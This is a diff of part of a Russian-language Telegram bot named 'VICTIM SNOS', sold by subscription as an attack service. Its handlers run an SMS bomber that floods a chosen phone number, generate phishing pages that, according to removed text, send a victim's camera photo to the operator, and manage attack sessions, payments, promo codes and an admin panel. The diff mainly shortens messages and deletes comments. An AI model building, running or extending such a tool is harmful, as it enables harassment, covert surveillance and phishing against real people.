-    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [create_button("❌ Отмена", "main_menu")]
-    ])
-    
     await cb.message.answer(
         "<b>🔱 VICTIM SNOS</b>\n\n"
         "💣 <b>SMS БОМБЕР</b>\n\n"
         "📱 Введите номер телефона:",
-        reply_markup=cancel_kb
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [create_button("❌ Отмена", "main_menu")]
+        ])
     )
 
 @dp.message(StateFilter(AttackState.waiting_phone))
 async def bomber_phone(msg: types.Message, state: FSMContext):
-    # ПРОВЕРКА ДОСТУПА
     if not await check_access_and_subscription(msg.from_user.id, msg):
         return
     
@@ -1297,7 +1252,6 @@ async def bomber_phone(msg: types.Message, state: FSMContext):
 
 @dp.message(StateFilter(AttackState.waiting_count))
 async def bomber_count(msg: types.Message, state: FSMContext):
-    # ПРОВЕРКА ДОСТУПА
     if not await check_access_and_subscription(msg.from_user.id, msg):
         return
     
@@ -1382,28 +1336,23 @@ async def bomber_count(msg: types.Message, state: FSMContext):
 
 @dp.callback_query(F.data == "phish_menu")
 async def phish_menu(cb: types.CallbackQuery, state: FSMContext):
-    # ПРОВЕРКА ДОСТУПА
     if not await check_access_and_subscription(cb.from_user.id, cb):
         return
     
     await state.set_state(AttackState.waiting_title)
     await cb.message.delete()
     
-    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [create_button("❌ Отмена", "main_menu")]
-    ])
-    
     await cb.message.answer(
         "<b>🔱 VICTIM SNOS</b>\n\n"
         "🎣 <b>ФИШИНГ</b>\n\n"
-        "Введите заголовок страницы:\n"
-        "<i>Например: Telegram Security Check</i>",
-        reply_markup=cancel_kb
+        "Введите заголовок страницы:",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [create_button("❌ Отмена", "main_menu")]
+        ])
     )
 
 @dp.message(StateFilter(AttackState.waiting_title))
 async def phish_title(msg: types.Message, state: FSMContext):
-    # ПРОВЕРКА ДОСТУПА
     if not await check_access_and_subscription(msg.from_user.id, msg):
         return
     
@@ -1415,8 +1364,7 @@ async def phish_title(msg: types.Message, state: FSMContext):
     
     status_msg = await send_message_with_banner(
         msg,
-        "🎣 <b>СОЗДАНИЕ СТРАНИЦЫ</b>\n\n"
-        "⏳ Пожалуйста, подождите..."
+        "🎣 <b>СОЗДАНИЕ СТРАНИЦЫ</b>\n\n⏳ Подождите..."
     )
     
     page_id = hashlib.md5(f"{user_id}_{time.time()}".encode()).hexdigest()[:10]
@@ -1426,16 +1374,13 @@ async def phish_title(msg: types.Message, state: FSMContext):
         await status_msg.edit_caption(
             caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                    f"✅ <b>СТРАНИЦА СОЗДАНА</b>\n\n"
-                   f"🔗 Ссылка:\n<code>{url}</code>\n\n"
-                   f"📸 При переходе жертвы по ссылке и разрешении камеры "
-                   f"вы получите фото в этот чат.",
+                   f"🔗 Ссылка:\n<code>{url}</code>",
             reply_markup=get_main_menu(user_id)
         )
     else:
         await status_msg.edit_caption(
             caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
-                   f"❌ <b>ОШИБКА СОЗДАНИЯ</b>\n\n"
-                   f"Попробуйте позже",
+                   f"❌ <b>ОШИБКА</b>",
             reply_markup=get_main_menu(user_id)
         )
 
@@ -1444,28 +1389,14 @@ async def handle_phish_photo(msg: types.Message):
     if msg.caption:
         for page_id, page in list(phish_pages.items()):
             if page_id in msg.caption and msg.chat.id == page.get("chat_id"):
-                logger.info(f"Phishing photo received from {page_id}")
-                await msg.reply(
-                    "📸 <b>ФОТО ПОЛУЧЕНО!</b>\n\n"
-                    f"ID страницы: <code>{page_id}</code>"
-                )
+                await msg.reply(f"📸 Фото получено!\nID: <code>{page_id}</code>")
                 break
 
 @dp.callback_query(F.data == "purchase_menu")
 async def purchase_menu(cb: types.CallbackQuery):
-    buttons = [
-        [("💎 30 дней - 100₽", "buy_30d")],
-        [("💎 60 дней - 200₽", "buy_60d")],
-        [("👑 Навсегда - 400₽", "buy_forever")],
-        [("🎁 Промокод", "use_promo")],
-        [("◀️ НАЗАД", "main_menu")]
-    ]
-    
     await cb.message.edit_caption(
-        caption="<b>🔱 VICTIM SNOS</b>\n\n"
-               "<b>💰 ПРИОБРЕТЕНИЕ ДОСТУПА</b>\n\n"
-               "Выберите тариф:",
-        reply_markup=create_keyboard(buttons)
+        caption="<b>🔱 VICTIM SNOS</b>\n\n<b>💰 ПРИОБРЕТЕНИЕ ДОСТУПА</b>\n\nВыберите тариф:",
+        reply_markup=get_purchase_menu()
     )
 
 @dp.callback_query(F.data.startswith("buy_"))
@@ -1493,11 +1424,7 @@ async def buy_subscription(cb: types.CallbackQuery):
     )
     
     await cb.message.delete()
-    await cb.message.answer(
-        f"💳 <b>СЧЕТ ВЫСТАВЛЕН</b>\n\n"
-        f"Тариф: {name}\n"
-        f"Сумма: {price}₽"
-    )
+    await cb.message.answer(f"💳 Счет выставлен\nТариф: {name}\nСумма: {price}₽")
 
 @dp.pre_checkout_query()
 async def process_pre_checkout(pre_checkout_query: PreCheckoutQuery):
@@ -1521,7 +1448,7 @@ async def process_successful_payment(msg: types.Message):
         await msg.answer(
             f"✅ <b>ОПЛАТА УСПЕШНА!</b>\n\n"
             f"Доступ активирован {text}\n"
-            f"Используйте /start для начала работы"
+            f"Используйте /start"
         )
 
 @dp.callback_query(F.data == "use_promo")
@@ -1530,8 +1457,7 @@ async def use_promo_start(cb: types.CallbackQuery, state: FSMContext):
     await cb.message.delete()
     
     await cb.message.answer(
-        "<b>🔱 VICTIM SNOS</b>\n\n"
-        "🎁 Введите промокод:",
+        "<b>🔱 VICTIM SNOS</b>\n\n🎁 Введите промокод:",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [create_button("❌ Отмена", "purchase_menu")]
         ])
@@ -1552,26 +1478,16 @@ async def process_promo(msg: types.Message, state: FSMContext):
             
             await send_message_with_banner(
                 msg,
-                f"✅ Промокод активирован!\n"
-                f"Доступ добавлен на {promo['days']} дней",
+                f"✅ Промокод активирован!\nДоступ на {promo['days']} дней",
                 get_main_menu(msg.from_user.id)
             )
         else:
-            await send_message_with_banner(
-                msg,
-                "❌ Промокод больше не действителен",
-                get_purchase_menu()
-            )
+            await send_message_with_banner(msg, "❌ Промокод истек!", get_purchase_menu())
     else:
-        await send_message_with_banner(
-            msg,
-            "❌ Неверный промокод",
-            get_purchase_menu()
-        )
+        await send_message_with_banner(msg, "❌ Неверный промокод!", get_purchase_menu())
 
 @dp.callback_query(F.data == "status")
 async def status(cb: types.CallbackQuery):
-    # ПРОВЕРКА ДОСТУПА
     if not await check_access_and_subscription(cb.from_user.id, cb):
         return
     
@@ -1593,8 +1509,7 @@ async def status(cb: types.CallbackQuery):
     pool = user_pools.get(user_id)
     if pool and pool.is_ready:
         stats = pool.get_stats()
-        sessions_text = f"📱 Сессий: {stats['available']}/{stats['total']}\n"
-        sessions_text += f"💚 Здоровых: {stats['healthy']}"
+        sessions_text = f"📱 Сессий: {stats['available']}/{stats['total']}\n💚 Здоровых: {stats['healthy']}"
     else:
         progress = pool.creation_progress if pool else 0
         sessions_text = f"🔄 Создание: {progress:.1f}%"
@@ -1630,32 +1545,9 @@ async def stop_attack(cb: types.CallbackQuery):
 async def stop_attack_button(cb: types.CallbackQuery):
     await stop_attack(cb)
     await cb.message.edit_caption(
-        caption="<b>🔱 VICTIM SNOS</b>\n\n"
-               "⏹ <b>АТАКА ОСТАНОВЛЕНА</b>",
+        caption="<b>🔱 VICTIM SNOS</b>\n\n⏹ <b>АТАКА ОСТАНОВЛЕНА</b>",
         reply_markup=get_main_menu(cb.from_user.id)
     )
-
-@dp.callback_query(F.data.startswith("check_sessions_"))
-async def check_sessions(cb: types.CallbackQuery):
-    user_id = int(cb.data.split("_")[2])
-    
-    if user_id != cb.from_user.id:
-        await cb.answer("Это не ваши сессии!", show_alert=True)
-        return
-    
-    pool = user_pools.get(user_id)
-    
-    if pool and pool.is_ready:
-        stats = pool.get_stats()
-        await cb.message.edit_caption(
-            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
-                   f"✅ Сессии готовы!\n"
-                   f"📊 Доступно: {stats['available']}/{stats['total']}",
-            reply_markup=get_main_menu(user_id)
-        )
-    else:
-        progress = pool.creation_progress if pool else 0
-        await cb.answer(f"Прогресс: {progress:.1f}%", show_alert=True)
 
 # ---------- АДМИН ПАНЕЛЬ ----------
 @dp.message(Command("admin"))
@@ -1663,16 +1555,13 @@ async def admin_cmd(msg: types.Message):
     await msg.delete()
     
     if msg.from_user.id != ADMIN_ID:
-        await send_message_with_banner(
-            msg,
-            "❌ У вас нет доступа к админ-панели"
-        )
+        await send_message_with_banner(msg, "❌ Нет доступа")
         return
     
     buttons = [
         [("➕ Добавить", "admin_add")],
         [("➖ Удалить", "admin_remove")],
-        [("🎁 Создать промокод", "admin_create_promo")],
+        [("🎁 Промокод", "admin_create_promo")],
         [("📋 Список", "admin_list")],
         [("📊 Статистика", "admin_stats")],
         [("◀️ НАЗАД", "main_menu")]
@@ -1687,15 +1576,13 @@ async def admin_cmd(msg: types.Message):
 @dp.callback_query(F.data == "admin_add")
 async def admin_add_start(cb: types.CallbackQuery, state: FSMContext):
     if cb.from_user.id != ADMIN_ID:
-        await cb.answer("Нет доступа", show_alert=True)
         return
     
     await state.set_state(AdminState.waiting_user_id)
     await cb.message.delete()
     
     await cb.message.answer(
-        "<b>👑 АДМИН</b>\n\n"
-        "Введите ID пользователя:",
+        "<b>👑 АДМИН</b>\n\nВведите ID пользователя:",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [create_button("❌ Отмена", "admin_menu")]
         ])
@@ -1713,7 +1600,7 @@ async def admin_add_user(msg: types.Message, state: FSMContext):
         await msg.delete()
         await send_message_with_banner(
             msg,
-            f"✅ Пользователь <code>{user_id}</code> добавлен навсегда",
+            f"✅ Пользователь <code>{user_id}</code> добавлен",
             get_admin_menu()
         )
     except:
@@ -1725,15 +1612,13 @@ async def admin_add_user(msg: types.Message, state: FSMContext):
 @dp.callback_query(F.data == "admin_create_promo")
 async def admin_promo_start(cb: types.CallbackQuery, state: FSMContext):
     if cb.from_user.id != ADMIN_ID:
-        await cb.answer("Нет доступа", show_alert=True)
         return
     
     await state.set_state(AdminState.waiting_promo_code)
     await cb.message.delete()
     
     await cb.message.answer(
-        "<b>👑 АДМИН</b>\n\n"
-        "Введите промокод:",
+        "<b>👑 АДМИН</b>\n\nВведите промокод:",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [create_button("❌ Отмена", "admin_menu")]
         ])
@@ -1800,7 +1685,6 @@ async def admin_promo_uses(msg: types.Message, state: FSMContext):
 @dp.callback_query(F.data == "admin_remove")
 async def admin_remove_menu(cb: types.CallbackQuery):
     if cb.from_user.id != ADMIN_ID:
-        await cb.answer("Нет доступа", show_alert=True)
         return
     
     if not ALLOWED_USERS:
@@ -1842,15 +1726,13 @@ async def admin_remove_user(cb: types.CallbackQuery):
                 shutil.rmtree(session_dir)
     
     await cb.message.edit_caption(
-        caption=f"<b>👑 АДМИН</b>\n\n"
-               f"✅ Пользователь <code>{user_id}</code> удален",
+        caption=f"<b>👑 АДМИН</b>\n\n✅ Пользователь <code>{user_id}</code> удален",
         reply_markup=get_admin_menu()
     )
 
 @dp.callback_query(F.data == "admin_list")
 async def admin_list(cb: types.CallbackQuery):
     if cb.from_user.id != ADMIN_ID:
-        await cb.answer("Нет доступа", show_alert=True)
         return
     
     text = "<b>👑 ПОЛЬЗОВАТЕЛИ</b>\n\n"
@@ -1877,7 +1759,6 @@ async def admin_list(cb: types.CallbackQuery):
 @dp.callback_query(F.data == "admin_stats")
 async def admin_stats(cb: types.CallbackQuery):
     if cb.from_user.id != ADMIN_ID:
-        await cb.answer("Нет доступа", show_alert=True)
         return
     
     total_sessions = sum(len(pool.sessions) for pool in user_pools.values())
@@ -1901,9 +1782,7 @@ async def admin_stats(cb: types.CallbackQuery):
     )
 
 def get_admin_menu() -> InlineKeyboardMarkup:
-    buttons = [
-        [create_button("◀️ НАЗАД", "admin_menu")]
-    ]
+    buttons = [[create_button("◀️ НАЗАД", "admin_menu")]]
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
 # ---------- ЗАПУСК ----------
@@ -1913,7 +1792,7 @@ async def on_startup():
     
     os.makedirs("sessions", exist_ok=True)
     
-    logger.info("Bot started! Access control ENABLED")
+    logger.info("Bot started!")
 
 async def main():
     await on_startup()
@@ -1925,6 +1804,6 @@ if __name__ == "__main__":
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
-        logger.info("Bot stopped by user")
+        logger.info("Bot stopped")
     except Exception as e:
         logger.error(f"Fatal error: {e}")
